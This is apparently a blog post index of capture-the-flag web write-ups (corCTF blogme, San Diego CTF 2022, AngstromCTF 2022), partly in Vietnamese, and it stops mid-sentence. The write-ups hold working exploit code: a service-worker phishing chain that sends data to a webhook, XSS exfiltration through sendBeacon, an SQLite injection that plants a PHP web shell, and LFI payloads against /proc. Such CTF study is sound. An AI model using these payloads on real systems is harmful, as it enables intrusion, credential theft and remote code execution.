tr√™n server:filter upload file·ªû ƒë√¢y ta nh·∫≠n th·∫•y n·∫øu user l√† admin th√¨ s·∫Ω kh√¥ng c·∫ßn ph·∫£i check type c·ªßa file upload n√™n m·ª•c ƒë√≠ch l√† k·∫øt h·ª£p v·ªõi csrf ƒë·ªÉ upload file.Admin bot c√≥ nhi·ªám v·ª• navigate t·ªõi /api/comment sau khi view post c·ªßa ta, g√µ flag v√†o √¥ comment v√† ·∫•n submit.Sau khi th·ª≠ t·∫°o m·ªôt post v·ªõi n·ªôi dung l√† corCTF{test_flag} ƒë·ªÉ t·ª± test th√¨ m√¨nh nh·∫≠n ra n·ªôi dung ƒë√£ b·ªã thay ƒë·ªïi, ƒëo·∫°n code ƒë√≥ n·∫±m ·ªü:replace flag commentV·∫ßy l√† ta ph·∫£i nghƒ© ra m·ªôt c√°ch ƒë·ªÉ l·∫•y ƒë∆∞·ª£c n·ªôi dung c·ªßa comment m√† kh√¥ng b·ªã server thay ƒë·ªïi gi√° tr·ªã.H∆∞·ªõng ƒëi c·ªßa t√°c gi·∫£ nh∆∞ sau: force admin bot upload m·ªôt sw.js file, file n√†y ta c√≥ th·ªÉ access t·ªõi b·∫±ng ƒë∆∞·ªùng d·∫´n /api/file?id=&amp;lt;file-id&amp;gt;. Comment page ·ªü ƒë∆∞·ªùng d·∫´n /api/comment c√πng v·ªõi file upload ƒë·ªÅu thu·ªôc c√πng th∆∞ m·ª•c /api n√™n service woker c√≥ th·ªÉ ho·∫°t ƒë·ªông tr√™n comment page.T√°c gi·∫£ t·∫°o m·ªôt s·ª± ki·ªán fetch trong sw.js ƒë·ªÉ ngƒÉn kh√¥ng cho request ƒëi ƒë·∫øn server m√† t·ª± tr·∫£ v·ªÅ response nh·ªù v√†o SW. Response tr·∫£ v·ªÅ kh√¥ng ph·∫£i l√† /api/comment ban ƒë·∫ßu n·ªØa, m√† thay v√†o ƒë√≥ l√† m·ªôt page theo ki·ªÉu Phishing, khi admin bot g√µ comment v√† ·∫•n submit th√¨ n·ªôi dung c·ªßa comment s·∫Ω ƒë∆∞·ª£c g·ª≠i ƒë·∫øn webhook c·ªßa ta.C√°c b∆∞·ªõc chu·∫©n b·ªã: M·ªôt post v·ªõi content: &amp;lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;url=https://exploitpage&quot; /&amp;gt; M·ªôt post d√πng ƒë·ªÉ bypass CSP (t·∫°m g·ªçi id c·ªßa post n√†y l√† EVAL_POSTID) v·ªõi content:&amp;lt;form id=_cf_translation&amp;gt;&amp;lt;img id=lang-selector name=blobs&amp;gt;&amp;lt;output id=locale&amp;gt;&amp;lt;script&amp;gt;eval(name)&amp;lt;/script&amp;gt;&amp;lt;/output&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;a data-translate=value&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;script src=/cdn-cgi/scripts/zepto.min.js&amp;gt;&amp;lt;/script&amp;gt;&amp;lt;script src=/cdn-cgi/scripts/cf.common.js&amp;gt;&amp;lt;/script&amp;gt;&amp;lt;script src=/cdn-cgi/scripts/cf.common.js&amp;gt;&amp;lt;/script&amp;gt;Khai th√°c: Stage 1: g·ª≠i admin m·ªôt url tr·ªè t·ªõi post ch·ª©a meta tag -&amp;gt; redirect ƒë·∫øn exploit page, t·∫°i ƒë√¢y set window.name b·∫±ng payload d√πng ƒë·ªÉ upload sw.js, sau ƒë√≥ redirect v·ªÅ l·∫°i https://blogme.be.ax/post/${EVAL_POSTID} -&amp;gt; l√∫c n√†y payload s·∫Ω ƒë∆∞·ª£c executed v√† g·ª≠i id c·ªßa file sw.js (SW_FILEID) ƒë√£ ƒë∆∞·ª£c upload ƒë·∫øn webhook. Stage 2: register sw.js ƒë√£ upload register(&#39;https://blogme.be.ax/api/file?id=${SW_FILEID}&#39;)Khai th√°cExploit code:&amp;lt;!DOCTYPE html&amp;gt;&amp;lt;html&amp;gt;&amp;lt;body&amp;gt; &amp;lt;!-- make two pages, one with the meta tag, and the other with the form tag csp bypass set eval post id to the id of the meta tag at window.name at the bottom, run stage1 first. send the post that has the meta redirect to the admin this sends the file id of the service worker to a webhook, which you can then set as service worker file id. then, change it to run stage2 your webhook should have the flag! --&amp;gt; &amp;lt;!-- &amp;lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;url=https://THISHTMLFILE&quot; /&amp;gt; --&amp;gt; &amp;lt;!--&amp;lt;form id=_cf_translation&amp;gt;&amp;lt;img id=lang-selector name=blobs&amp;gt;&amp;lt;output id=locale&amp;gt;&amp;lt;script&amp;gt;eval(name)&amp;lt;/script&amp;gt;&amp;lt;/output&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;a data-translate=value&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;script src=/cdn-cgi/scripts/zepto.min.js&amp;gt;&amp;lt;/script&amp;gt;&amp;lt;script src=/cdn-cgi/scripts/cf.common.js&amp;gt;&amp;lt;/script&amp;gt;&amp;lt;script src=/cdn-cgi/scripts/cf.common.js&amp;gt;&amp;lt;/script&amp;gt;--&amp;gt; &amp;lt;script&amp;gt; const EVAL_POSTID = &quot;8d44702a-dc4b-43f4-8651-0a64bc88fb08&quot;; const SW_FILEID = &quot;a944179f-b7eb-4297-a3e3-9548feff8918&quot;; /*self.addEventListener(&#39;fetch&#39;, async (e) =&amp;gt; { console.log(e); if(e.request.url.includes(&quot;/api/comment&quot;)) { e.respondWith(new Response(new Blob([`&amp;lt;!DOCTYPE html&amp;gt;&amp;lt;html lang=&quot;en&quot;&amp;gt;&amp;lt;head&amp;gt; &amp;lt;meta charset=&quot;utf-8&quot;&amp;gt; &amp;lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0, shrink-to-fit=no&quot;&amp;gt; &amp;lt;title&amp;gt;blogme&amp;lt;/title&amp;gt; &amp;lt;link rel=&quot;stylesheet&quot; href=&quot;/assets/bootstrap/css/bootstrap.min.css&quot;&amp;gt; &amp;lt;link rel=&quot;stylesheet&quot; href=&quot;https://fonts.googleapis.com/css2?family=Lato:wght@400;700&amp;amp;amp;display=swap&quot;&amp;gt; &amp;lt;link rel=&quot;stylesheet&quot; href=&quot;https://fonts.googleapis.com/css?family=Lora&quot;&amp;gt; &amp;lt;link rel=&quot;stylesheet&quot; href=&quot;/assets/css/styles.css&quot;&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt; &amp;lt;nav class=&quot;navbar navbar-dark navbar-expand-md textwhite bg-primary text-white navigation-clean&quot;&amp;gt; &amp;lt;div class=&quot;container&quot;&amp;gt; &amp;lt;a class=&quot;navbar-brand&quot; href=&quot;/&quot;&amp;gt;blogme&amp;lt;/a&amp;gt; &amp;lt;button data-bs-toggle=&quot;collapse&quot; class=&quot;navbar-toggler&quot; data-bs-target=&quot;#navcol&quot;&amp;gt; &amp;lt;span class=&quot;visually-hidden&quot;&amp;gt;Toggle navigation&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;navbar-toggler-icon&quot;&amp;gt;&amp;lt;/span&amp;gt; &amp;lt;/button&amp;gt; &amp;lt;div class=&quot;collapse navbar-collapse&quot; id=&quot;navcol&quot;&amp;gt; &amp;lt;ul class=&quot;navbar-nav ms-auto&quot;&amp;gt; &amp;lt;li class=&quot;nav-item&quot;&amp;gt;&amp;lt;a class=&quot;nav-link&quot; href=&quot;/&quot;&amp;gt;Home&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt; &amp;lt;li class=&quot;nav-item&quot;&amp;gt;&amp;lt;a class=&quot;nav-link&quot; href=&quot;/profile&quot;&amp;gt;Profile&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt; &amp;lt;li class=&quot;nav-item&quot;&amp;gt;&amp;lt;a class=&quot;nav-link&quot; href=&quot;/posts&quot;&amp;gt;Your Posts&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt; &amp;lt;li class=&quot;nav-item&quot;&amp;gt;&amp;lt;a class=&quot;nav-link&quot; href=&quot;/api/logout&quot;&amp;gt;Logout&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt; &amp;lt;/ul&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;/nav&amp;gt; &amp;lt;div class=&quot;container card bg-secondary mt-5 p-0&quot;&amp;gt; &amp;lt;div class=&quot;card-header&quot;&amp;gt;&amp;lt;h3 class=&quot;m-0&quot;&amp;gt;Comment&amp;lt;/h3&amp;gt;&amp;lt;/div&amp;gt; &amp;lt;div class=&quot;card-body&quot;&amp;gt; &amp;lt;div class=&quot;card-text&quot;&amp;gt;Enter your comment below:&amp;lt;/div&amp;gt; &amp;lt;form method=&quot;POST&quot; action=&quot;https://enx4khh4m6jy.x.pipedream.net/&quot;&amp;gt; &amp;lt;input class=&quot;form-control&quot; type=&quot;hidden&quot; name=&quot;id&quot; value=&quot;7213f554-2b98-422a-8416-7a45d6c716be&quot;&amp;gt; &amp;lt;div class=&quot;input-group mt-3&quot;&amp;gt; &amp;lt;span class=&quot;input-group-text&quot;&amp;gt;Comment&amp;lt;/span&amp;gt; &amp;lt;textarea class=&quot;form-control&quot; name=&quot;text&quot; rows=3 maxlength=150&amp;gt;&amp;lt;/textarea&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;input type=&quot;hidden&quot; name=&quot;_csrf&quot; value=&quot;QaJVpRex-Yx3UhVRDCHWKT8GgJwg8P9HkRAM&quot;&amp;gt; &amp;lt;button class=&quot;btn btn-primary mt-3 float-end&quot; type=&quot;submit&quot;&amp;gt;Comment&amp;lt;/button&amp;gt; &amp;lt;/form&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;script src=&quot;/assets/bootstrap/js/bootstrap.min.js&quot;&amp;gt;&amp;lt;/scr` + `ipt&amp;gt; &amp;lt;script src=&quot;/assets/js/jquery.min.js&quot;&amp;gt;&amp;lt;/scr` + `ipt&amp;gt; &amp;lt;script src=&quot;/assets/js/script.js&quot;&amp;gt;&amp;lt;/scr` + `ipt&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt; `], { type: &#39;text/html&#39; }))); } return;}); */ let stage1 = () =&amp;gt; { fetch(&quot;data:application/javascript;base64,c2VsZi5hZGRFdmVudExpc3RlbmVyKCdmZXRjaCcsIGFzeW5jIChlKSA9PiB7CiAgICBjb25zb2xlLmxvZyhlKTsKICAgIGlmKGUucmVxdWVzdC51cmwuaW5jbHVkZXMoIi9hcGkvY29tbWVudCIpKSB7CiAgICAgICAgZS5yZXNwb25kV2l0aChuZXcgUmVzcG9uc2UobmV3IEJsb2IoW2AKCjwhRE9DVFlQRSBodG1sPgo8aHRtbCBsYW5nPSJlbiI+Cgo8aGVhZD4KICAgIDxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4KICAgIDxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MS4wLCBzaHJpbmstdG8tZml0PW5vIj4KICAgIDx0aXRsZT5ibG9nbWU8L3RpdGxlPgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSIvYXNzZXRzL2Jvb3RzdHJhcC9jc3MvYm9vdHN0cmFwLm1pbi5jc3MiPgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL2ZvbnRzLmdvb2dsZWFwaXMuY29tL2NzczI/ZmFtaWx5PUxhdG86d2dodEA0MDA7NzAwJmFtcDtkaXNwbGF5PXN3YXAiPgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL2ZvbnRzLmdvb2dsZWFwaXMuY29tL2Nzcz9mYW1pbHk9TG9yYSI+CiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Ii9hc3NldHMvY3NzL3N0eWxlcy5jc3MiPgo8L2hlYWQ+Cgo8Ym9keT4KICAgIDxuYXYgY2xhc3M9Im5hdmJhciBuYXZiYXItZGFyayBuYXZiYXItZXhwYW5kLW1kIHRleHR3aGl0ZSBiZy1wcmltYXJ5IHRleHQtd2hpdGUgbmF2aWdhdGlvbi1jbGVhbiI+CiAgICAgICAgPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KICAgICAgICAgICAgPGEgY2xhc3M9Im5hdmJhci1icmFuZCIgaHJlZj0iLyI+YmxvZ21lPC9hPgogICAgICAgICAgICA8YnV0dG9uIGRhdGEtYnMtdG9nZ2xlPSJjb2xsYXBzZSIgY2xhc3M9Im5hdmJhci10b2dnbGVyIiBkYXRhLWJzLXRhcmdldD0iI25hdmNvbCI+CiAgICAgICAgICAgICAgICA8c3BhbiBjbGFzcz0idmlzdWFsbHktaGlkZGVuIj5Ub2dnbGUgbmF2aWdhdGlvbjwvc3Bhbj4KICAgICAgICAgICAgICAgIDxzcGFuIGNsYXNzPSJuYXZiYXItdG9nZ2xlci1pY29uIj48L3NwYW4+CiAgICAgICAgICAgIDwvYnV0dG9uPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2xsYXBzZSBuYXZiYXItY29sbGFwc2UiIGlkPSJuYXZjb2wiPgogICAgICAgICAgICAgICAgPHVsIGNsYXNzPSJuYXZiYXItbmF2IG1zLWF1dG8iPgogICAgICAgICAgICAgICAgICAgIDxsaSBjbGFzcz0ibmF2LWl0ZW0iPjxhIGNsYXNzPSJuYXYtbGluayIgaHJlZj0iLyI+SG9tZTwvYT48L2xpPgogICAgICAgICAgICAgICAgICAgIDxsaSBjbGFzcz0ibmF2LWl0ZW0iPjxhIGNsYXNzPSJuYXYtbGluayIgaHJlZj0iL3Byb2ZpbGUiPlByb2ZpbGU8L2E+PC9saT4KICAgICAgICAgICAgICAgICAgICA8bGkgY2xhc3M9Im5hdi1pdGVtIj48YSBjbGFzcz0ibmF2LWxpbmsiIGhyZWY9Ii9wb3N0cyI+WW91ciBQb3N0czwvYT48L2xpPgogICAgICAgICAgICAgICAgICAgIDxsaSBjbGFzcz0ibmF2LWl0ZW0iPjxhIGNsYXNzPSJuYXYtbGluayIgaHJlZj0iL2FwaS9sb2dvdXQiPkxvZ291dDwvYT48L2xpPgogICAgICAgICAgICAgICAgPC91bD4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgPC9kaXY+CiAgICA8L25hdj4KCiAgICA8ZGl2IGNsYXNzPSJjb250YWluZXIgY2FyZCBiZy1zZWNvbmRhcnkgbXQtNSBwLTAiPgogICAgICAgIDxkaXYgY2xhc3M9ImNhcmQtaGVhZGVyIj48aDMgY2xhc3M9Im0tMCI+Q29tbWVudDwvaDM+PC9kaXY+CiAgICAgICAgPGRpdiBjbGFzcz0iY2FyZC1ib2R5Ij4KICAgICAgICAgICAgPGRpdiBjbGFzcz0iY2FyZC10ZXh0Ij5FbnRlciB5b3VyIGNvbW1lbnQgYmVsb3c6PC9kaXY+CiAgICAgICAgICAgIDxmb3JtIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSJodHRwczovL2VueDRraGg0bTZqeS54LnBpcGVkcmVhbS5uZXQvIj4KICAgICAgICAgICAgICAgIDxpbnB1dCBjbGFzcz0iZm9ybS1jb250cm9sIiB0eXBlPSJoaWRkZW4iIG5hbWU9ImlkIiB2YWx1ZT0iNzIxM2Y1NTQtMmI5OC00MjJhLTg0MTYtN2E0NWQ2YzcxNmJlIj4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImlucHV0LWdyb3VwIG10LTMiPgogICAgICAgICAgICAgICAgICAgIDxzcGFuIGNsYXNzPSJpbnB1dC1ncm91cC10ZXh0Ij5Db21tZW50PC9zcGFuPgogICAgICAgICAgICAgICAgICAgIDx0ZXh0YXJlYSBjbGFzcz0iZm9ybS1jb250cm9sIiBuYW1lPSJ0ZXh0IiByb3dzPTMgbWF4bGVuZ3RoPTE1MD48L3RleHRhcmVhPgogICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJfY3NyZiIgdmFsdWU9IlFhSlZwUmV4LVl4M1VoVlJEQ0hXS1Q4R2dKd2c4UDlIa1JBTSI+CiAgICAgICAgICAgICAgICA8YnV0dG9uIGNsYXNzPSJidG4gYnRuLXByaW1hcnkgbXQtMyBmbG9hdC1lbmQiIHR5cGU9InN1Ym1pdCI+Q29tbWVudDwvYnV0dG9uPgogICAgICAgICAgICA8L2Zvcm0+CiAgICAgICAgPC9kaXY+CiAgICA8L2Rpdj4KICAgIDxzY3JpcHQgc3JjPSIvYXNzZXRzL2Jvb3RzdHJhcC9qcy9ib290c3RyYXAubWluLmpzIj48L3NjcmAgKyBgaXB0PgogICAgPHNjcmlwdCBzcmM9Ii9hc3NldHMvanMvanF1ZXJ5Lm1pbi5qcyI+PC9zY3JgICsgYGlwdD4KICAgIDxzY3JpcHQgc3JjPSIvYXNzZXRzL2pzL3NjcmlwdC5qcyI+PC9zY3JgICsgYGlwdD4KPC9ib2R5Pgo8L2h0bWw+CiAgICAgICAgYF0sIHsgdHlwZTogJ3RleHQvaHRtbCcgfSkpKTsKICAgIH0KICAgIHJldHVybjsKfSk7&quot;).then(r =&amp;gt; r.blob()).then(async b =&amp;gt; { let formData = new FormData(); formData.append(&quot;blob&quot;, b, &quot;sw.js&quot;); let pfp = await (await fetch(&quot;/profile&quot;)).text(); let csrf = /\\?_csrf=(.*?)&quot;/.exec(pfp)[1]; let response = await fetch(&quot;/api/upload/?_csrf=&quot; + encodeURIComponent(csrf), { method: &#39;POST&#39;, body: formData }); navigator.sendBeacon(&quot;https://enx4khh4m6jy.x.pipedream.net/&quot;, new URLSearchParams(new URL(response.url).search).get(&quot;message&quot;)); }); }; let stage2 = (SW_FILEID) =&amp;gt; { navigator.serviceWorker.register(`https://blogme.be.ax/api/file?id=${SW_FILEID}`, { scope: &#39;/api/comment&#39; }); }; window.name = &quot;(&quot; + stage1.toString() + `)(&quot;${SW_FILEID}&quot;);`; location.href = `https://blogme.be.ax/post/${EVAL_POSTID}`; &amp;lt;/script&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;T√†i li·ªáu tham kh·∫£ohttps://www.akamai.com/blog/security/abusing-the-service-workers-apihttps://betterprogramming.pub/man-in-the-middle-attacks-via-javascript-service-workers-52647ac929a2https://brycec.me/posts/corctf_2021_challenges#blogme" }, { "title": "San Diego CTF 2022", "url": "/posts/sandiegoctf2022/", "categories": "WebSec, CTF", "tags": "LFI", "date": "2022-05-09 22:07:00 +0700", "snippet": "Sollution c·ªßa 4 b√†i web.Apollo 1337B√†i n√†y ch·ªâ ƒë·ªÉ l√†m quen v·ªõi c√°c tool n√™n coi h·∫øt video c·ªßa h·ªç l√† solve ƒë∆∞·ª£c sdctf{0ne_GiANT_L3AP_4_tH3_NeXT_gENERa7i0n}Lots of LogsH∆∞·ªõng ƒëi c·ªßa b√†i n√†y l√† bruteforce c√°c log file theo d·∫°ng https://logs.sdc.tf/logs/&amp;lt;year&amp;gt;/&amp;lt;month&amp;gt;/&amp;lt;date&amp;gt;/&amp;lt;weekday&amp;gt;.logscript exploit:from datetime import datetimeimport requestsTARGET = &quot;https://logs.sdc.tf/logs/&quot;found = Falsefor year in range (2018, 2019): for month in range (1,12): for date in range (1,31): try: current = datetime(year,month, date).strftime(&quot;%A&quot;)[0:3] r = requests.get(TARGET + f&quot;{year}/{month}/{date}/{current}.log&quot;) if &quot;sdc&quot; in r.text: print(&quot;[-] Found with url: &quot; + TARGET + f&quot;{year}/{month}/{date}/{current}.log&quot;) quit() except: pass sdctf{b3tr4y3d_by_th3_l0gs_8a4dfd}JaWT that down!B√†i n√†y kh√≥ ·ªü ch·ªó jwt ch·ªâ c√≥ gi√° tr·ªã trong m·ªôt kho·∫£ng th·ªùi gian ng·∫Øn (tr∆∞·ªùng exp) n√™n c√°ch gi·∫£i quy·∫øt s·∫Ω l√† re-login sau m·ªói request. M·ªói response tr·∫£ v·ªÅ t∆∞∆°ng ·ª©ng s·∫Ω t∆∞·ªõng ·ª©ng v·ªõi t·ª´ng k√≠ t·ª± ti·∫øp theo c·ªßa flag.script exploit:import requestss = requests.Session()TARGET = &quot;https://jawt.sdc.tf/&quot;cre = {&quot;username&quot;: &quot;AzureDiamond&quot;, &quot;password&quot;: &quot;hunter2&quot;}url = TARGET + &quot;s&quot;flag = &quot;s&quot; while True: s = requests.Session() r = s.post(TARGET + &#39;login&#39;, data=cre) r = s.get(url) if r.status_code != 200: break url += &#39;/&#39; + r.text flag += r.text print(flag)print(f&quot;[-]Flag: {flag}&quot;) sdctf{Th3_m0r3_t0k3ns_the_le55_pr0bl3ms_adf3d}CURL Up and ReadServer cho m·ªôt √¥ ƒë·ªÉ nh·∫≠p url, sau ƒë√≥ hi·ªÉn th·ªã response nh·∫≠n ƒë∆∞·ª£c t·ª´ url n√†y cho user. H∆∞·ªõng ƒëi c·ªßa b√†i l√† khai th√°c l·ªói LFI b·∫±ng payload: file:///proc/&amp;lt;id&amp;gt;/environ. ·ªû ƒë√¢y curl command s·∫Ω ch·∫°y trong process con do h√†m execFileSync n√™n vi·ªác ta c·∫ßn l√†m l√† bruteforce process id c·ªßa process cha v√† grep flag.from base64 import b64encodeimport requestsTARGET = &quot;https://curl.sdc.tf&quot;for i in range (1000): print(f&quot;[-] Trying {i}&quot;) data = &#39;{&quot;url&quot;: &quot;file:///proc/ID/environ&quot;}&#39;.replace(&#39;ID&#39;, i) data_base64 = b64encode(data.encode()).decode() r = requests.get(TARGET + &quot;/read/&quot; + data_base64) if &quot;Internal Server Error&quot; not in r.text: if &quot;sdctf&quot; in r.text: print(&quot;[-] Found: &quot; + TARGET + &quot;/read/&quot; + data_base64) break sdctf{CURL_up_aNd_L0c@L_F1le_incLuSi0N}" }, { "title": "AngstromCTF 2022", "url": "/posts/angstromctf2022/", "categories": "WebSec, CTF", "tags": "xss, sqli, rce, xs-leak, cookie bomb, cache probing", "date": "2022-05-02 22:25:00 +0700", "snippet": "My solution for some web challenges in this competitionThe FlashUse DOM breakpoints in Chrome devtools, right click on p tag and chose Break on -&amp;gt; subtree modifications then step over to get flag actf{sp33dy_l1ke_th3_fl4sh}Auth Skipset cookie: user=admin actf{passwordless_authentication_is_the_new_hip_thing}crumbsexploit script:import requestsimport reTARGET = &quot;https://crumbs.web.actf.co/&quot;s = requests.Session()next = &quot;&quot;for i in range(1002): r = s.get(TARGET + next) if i == 1001: print(r.text) break next = re.search(r&quot;Go to (.*)&quot;, r.text).group(1) print(next) actf{w4ke_up_to_th3_m0on_6bdc10d7c6d5}Xtra Salty SardinesPay attention to the flowing lines:const name = req.body.name .replace(&quot;&amp;amp;&quot;, &quot;&amp;amp;amp;&quot;) .replace(&#39;&quot;&#39;, &quot;&amp;amp;quot;&quot;) .replace(&quot;&#39;&quot;, &quot;&amp;amp;apos;&quot;) .replace(&quot;&amp;lt;&quot;, &quot;&amp;amp;lt;&quot;) .replace(&quot;&amp;gt;&quot;, &quot;&amp;amp;gt;&quot;);I abuse that: The replace() method returns a new string with some or all matches of a pattern replaced by a replacement. The pattern can be a string or a RegExp, and the replacement can be a string or a function called for each match. If pattern is a string, only the first occurrence will be replaced.Payload:&#39;&amp;lt;&amp;gt;&amp;lt;/h1&amp;gt;&amp;lt;script&amp;gt;var x = new XMLHttpRequest;x = open(&#39;GET&#39;, &#39;/flag&#39;); x.onload = function() {navigator.sendBeacon(&#39;https://webhook.site/8771a7aa-4464-438a-84ac-7311eae5bd87&#39;, this.responseText)}; x.send();&amp;lt;/script&amp;gt; actf{those_sardines_are_yummy_yummy_in_my_tummy}School unblockerUse this.Exploit script:const express = require(&#39;express&#39;)const app = express();const port = Number(process.env.PORT) || 8888;app.post(&quot;/&quot;, (req, res) =&amp;gt; { res.redirect(307, &quot;http://127.0.0.1:8080/flag&quot;)});app.listen(port, () =&amp;gt; { console.log(`Server listening on port ${port}`);}); actf{dont_authenticate_via_ip_please}Art GalleryLFI in member parameter. Noted that /proc/1/cwd/ point to the current working directory in the docker container.Send the following payload to fetch Dockerfile.https://art-gallery.web.actf.co/gallery/?member=../../../../proc/1/cwd/DockerfileDockerfile:FROM node:17-bullseye-slimWORKDIR /appCOPY . .RUN mv git .gitRUN npm ciENV PORT=8080EXPOSE 8080CMD [&quot;node&quot;, &quot;index.js&quot;]The next step is to exploit the .git folder using GitHacker.After fetching all sources, use git log to check log commit.‚îå‚îÄ[nguyen@parrot]‚îÄ[~/LearningSpace/test/result/ec42c41d9bc611be9e22c4092e4828d0]‚îî‚îÄ‚îÄ‚ïº $git logcommit 1c584170fb33ae17a63e22456f19601efb1f23db (HEAD, origin/master, origin/HEAD, master)Author: imposter &amp;lt;sus@aplet.me&amp;gt;Date: Tue Apr 26 21:47:45 2022 -0400 bury secretscommit 713a4aba8af38c9507ced6ea41f602b105ca4101Author: imposter &amp;lt;sus@aplet.me&amp;gt;Date: Tue Apr 26 21:44:48 2022 -0400 remove vital secretscommit 56449caeb7973b88f20d67b4c343cbb895aa6bc7Author: imposter &amp;lt;sus@aplet.me&amp;gt;Date: Tue Apr 26 21:44:01 2022 -0400 add programgit checkout to check a commit.‚îÄ[‚úó]‚îÄ[nguyen@parrot]‚îÄ[~/LearningSpace/test/result/ec42c41d9bc611be9e22c4092e4828d0]‚îî‚îÄ‚îÄ‚ïº $git checkout 56449caeb7973b88f20d67b4c343cbb895aa6bc7Previous HEAD position was 1c58417 bury secretsHEAD is now at 56449ca add program‚îå‚îÄ[nguyen@parrot]‚îÄ[~/LearningSpace/test/result/ec42c41d9bc611be9e22c4092e4828d0]‚îî‚îÄ‚îÄ‚ïº $lserror.html flag.txt images index.html index.js package.json package-lock.json‚îå‚îÄ[nguyen@parrot]‚îÄ[~/LearningSpace/test/result/ec42c41d9bc611be9e22c4092e4828d0]‚îî‚îÄ‚îÄ‚ïº $cat flag.txt actf{lfi_me_alone_and_git_out_341n4kaf5u59v} actf{lfi_me_alone_and_git_out_341n4kaf5u59v}Secure VaultCreate an account: bla:bla then save the token value (jwt of bla account) after that Delete account. Then set the cookie value with token:&amp;lt;jwt token of bla account&amp;gt; -&amp;gt; return flag.The reason why it works is due to the following two lines in index.js:const user = users.get(res.locals.user.uid);res.type(&quot;text/plain&quot;).send(user.restricted ? user.vault : flag);if we send an old jwt, then user={} and user.restricted=undefined (because it has been already deleted from UserStore). actf{is_this_what_uaf_is}NoFlagsDockerfile:FROM php:8.1.5-apache-bullseyeCOPY printflag /printflagRUN chmod 111 /printflagCOPY src /var/www/htmlRUN chown -R root:root /var/www/html &amp;amp;&amp;amp; chmod -R 555 /var/www/html RUN mkdir /var/www/html/abyss &amp;amp;&amp;amp;\\ chown -R root:root /var/www/html/abyss &amp;amp;&amp;amp;\\ chmod -R 333 abyssEXPOSE 80From this file, i figure out following things: printflag a file with only-executable permission that used to print flag /var/www/html: readable and executable permission /var/www/html/abyss: writable and executable permission=&amp;gt; The target to achieve is RCE using sqlite injection.Read more from here.payload:&#39;);ATTACH DATABASE &#39;/var/www/html/abyss/exp.php&#39; AS exp;CREATE TABLE exp.pwn (dataz text);INSERT INTO exp.pwn (dataz) VALUES (&#39;&amp;lt;?system($_GET[&quot;cmd&quot;]); ?&amp;gt;&#39;);--Result:flagSustenanceI had worked in this challenge for 3 days, searching, trying, playing around with it but i couldn‚Äôt come up with a solution. So i will write what i have learned from orther people‚Äôs writeups üòó .Overview:overviewSource:const express = require(&quot;express&quot;);const cookieParser = require(&quot;cookie-parser&quot;);const path = require(&quot;path&quot;);const app = express();app.use(express.urlencoded({ extended: false }));// environment configconst port = Number(process.env.PORT) || 8080;const adminSecret = process.env.ADMIN_SECRET || &quot;secretpw&quot;;const flag = process.env.FLAG || &quot;actf{someone_is_going_to_submit_this_out_of_desperation}&quot;;function queryMiddleware(req, res, next) { res.locals.search = req.cookies.search || &quot;the quick brown fox jumps over the lazy dog&quot;; // admin is a cool kid if (req.cookies.admin === adminSecret) { res.locals.search = flag; } next();}app.use(cookieParser());app.get(&quot;/&quot;, (req, res) =&amp;gt; { res.sendFile(path.join(__dirname, &quot;index.html&quot;));});app.post(&quot;/s&quot;, (req, res) =&amp;gt; { if (req.body.search) { for (const [name, val] of Object.entries(req.body)) { res.cookie(name, val, { httpOnly: true }); } } res.redirect(&quot;/&quot;);});app.get(&quot;/q&quot;, queryMiddleware, (req, res) =&amp;gt; { const query = req.query.q || &quot;h&quot;; // h let status; if (res.locals.search.includes(query)) { status = &quot;succeeded, but please give me sustenance if you want to be able to see your search results because I desperately require sustenance&quot;; } else { status = &quot;failed&quot;; } res.redirect( &quot;/?m=&quot; + encodeURIComponent( `your search that took place at ${Date.now()} has ${status}` ) );});app.listen(port, () =&amp;gt; { console.log(`Server listening on port ${port}`);});Working flow: Set search string functionality sets the ‚Äúsearch string‚Äù and placed it in your cookie. Search string functionality return the status (succeeded/failed) whether the ‚Äúsearch string‚Äù (stored in cookie) includes the string in q - GET parameter.From those things, we can obviously figure out that it is kind of XS-Leaks challenge.There are 2 approach for solving the challenge: Cookie bomb and Cache probing attack.Cookie bombThe idea and solution came from Strellic and it is also the intended solution.For anyone who don‚Äôt know about this attack technique, this blog will be a good reference.We have already known that the server stored the string (if the user is admin, it will be the flag) in cookie and the response‚Äôs length in two case is difference (the successful one is longer than another). So if we make the search string very long but controling it to be just barely under the maximum of request header size then we can use the cookie bomb attack to trigger error-event with a view to figuring out whether it was successful or not.But there is still one problem we have to deal with. As you can see, SameSite has not been explicitly specified, the cookie will be treated as SameSite=Lax so that we can‚Äôt make the admin bot visit our page and send a lot of cookie because the ‚ÄúLax‚Äù cookie can just be sent by those ways and it have to obey the samesite rule. And @Strellic‚Äôs 